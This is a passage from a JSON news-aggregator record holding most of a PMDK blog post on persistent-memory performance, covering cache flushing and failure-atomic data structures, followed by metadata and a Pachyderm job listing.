beneficial for two reasons: a) there\u2019s no expensive syscall, and b) datacan be flushed with cacheline granularity, not a page granularity.\n Oh, and cachelines are 64 bytes on x86-64, meaning that stores smaller than thatincur some write amplification when writing to the DIMM.\n To sum up, persistent memory really is non-volatile, but stores need to beflushed out of the CPU cache, ideally using user-space instructions on individualcachelines.\n But\u2026 (it seems like there\u2019s always a but) cache flushing instructions evictthe lines from the cache. Which means that reading something immediately afterwriting it causes a cache miss - requiring the CPU to fetch that data from the DIMM.And that\u2019s not all. Even writing something again within the same cachelineafter a flush will usually cause a cache miss, doubling the cost of a store.\n  All of that really doesn\u2019t matter until you want to create some data structurethat is actually persistent. And by persistent I mean a data structure whoselifetime is longer than that of the process which created it.However, that definition would also include data structures that are serializedwhen the process quits, a well-known approach which is out of scope ofthis post\u2026 because it\u2019s boring.So, let\u2019s narrow down our focus to data structures that outlive processes andare always consistent even in presence of failures. We usually say that suchdata structures are failure atomic.\n That sounds eerily similar to concurrent (atomic) data structures, doesn\u2019t it?Just replace \u201cprocess\u201d with \u201cthread\u201d and \u201cfailure\u201d with \u201cpreemption\u201d.This observation lies at the foundation of many ideas around persistent memoryin academia and industry alike. To come up with efficient algorithms, we,the PMDK team, have been heavily taking advantage of the vast amount of workthat\u2019s been done for concurrent programming.\n foo-&gt;bar = 10;\t...\tfetch_and_add(&amp;foo-&gt;bar, 5);\t/* visible = 15, persistent on DIMM = ? (10 or 15) */\tpersist(&amp;foo-&gt;bar);\t/* visible = 15, persistent on DIMM = 15 */\n One problem with straight out using concurrent data structures for failureatomicity is the difference between visibility and persistence.Concurrent data structure have to guarantee that all threads of execution alwayssee a consistent state. Persistent ones however also have to ensure that data ispresent in the persistent domain before other processes or threads are allowed tomake any decisions based on the structure\u2019s state. Doing this the right way iscritical for performance.\n    Each time an element is inserted into a linked list, there\u2019s a need to:\n  To do this in a concurrent way we could simply surround these operationswith some kind of a lock that would prevent other threads from accessing the listwhile there\u2019s an ongoing insert. For the adventurous, writing a lock-free algorithm,that could maybe scale better, is also an option.\n  Making it failure atomic however, requires us to answer a couple of fundamentalquestions. What does it even mean to allocate memory? The heap itself needs tobe persistent. And we have to make sure that the allocated object isn\u2019t leakedwhen something interrupts the program. The heap is persistent after all.Next, how will we make changes to multiple disjoint memory locations in a waythat is fail-safe atomic? It\u2019s not as simple as just preventing other processesfrom viewing our data structure while we modify it. The executionenvironment of our application can be brutally killed at any moment, forcing thenext process that attaches to the same persistent memory region to somehow dealwith the interrupted operation.And finally, we have to ask ourselves if this is really what we want to do? Ismaking a persistent doubly-linked list the goal? From my experience,creating a data structure or an algorithm is just a means to an end. Once wechange our assumptions about memory a little bit, it might make more senseto reconsider our initial instinct of just using what we know.\n With libpmemobj, in retrospect, we\u2019ve incorrectly answered the first twoof those questions, and failed to even ask the third.\n And with this, I\u2019ll leave you thinking until the holiday season is over :)\n  In this post, we\u2019ve learned about what persistent memory is and how it can be used.We\u2019ve also discussed what it means for a data structure to be persistent, and howthat might affect performance.\n In the next part, we are going to be diving deeper into my answers to thethree questions I\u2019ve posed, and how we\u2019ve improved our libraries based onself reflections that we\u2019ve had after we reconsidered our initial assumptionsabout persistent memory.", "posttime": "2020-05-14 23:48:40", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u6027\u80fd,\u5b58\u50a8\u5668,persistent,\u5185\u5b58", "title": "\u6301\u4e45\u5b58\u50a8\u5668\u6027\u80fd\uff1a300\u7eb3\u79d2", "title_en": "Performance of Persistent Memory: 300 nanoseconds", "transed": 1, "url": "https://pmem.io/2019/12/19/performance.html", "via": "", "real_tags": ["\u6027\u80fd", "\u5b58\u50a8\u5668", "\u5185\u5b58"]}, {"category": "", "categoryclass": "", "imagename": "dae8810ade3c3946bbe9fc35955157c1.png", "infoid": 1002103, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u9996\u5e2d\u6570\u636e\u79d1\u5b66\u5e03\u9053\u5458(\u7f8e\u56fd\u8fdc\u7a0b\u53ef\u9009)\u3002\n\u5e03\u9053\u4e3b\u4e49\u548c\u5f00\u53d1\u8005\u5021\u5bfc\u8005", "note_en": "Lead Data Science Evangelist (US Remote Optional)\n Evangelism and Developer Advocacy", "posttime": "2020-05-14 23:48:21", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "hiring,\u6570\u636e", "title": "Pachyderm\u6b63\u5728\u62db\u8058\u9ad8\u7ea7DevOps\u548c\u5206\u5e03\u5f0f\u7cfb\u7edf\u5de5\u7a0b\u5e08", "title_en": "Pachyderm Is Hiring Senior DevOps and Distributed Systems Engineers", "transed": 1, "url": "https://jobs.lever.co/pachyderm/", "via": "", "real_tags": ["hiring", "\u6570\u636e"]}]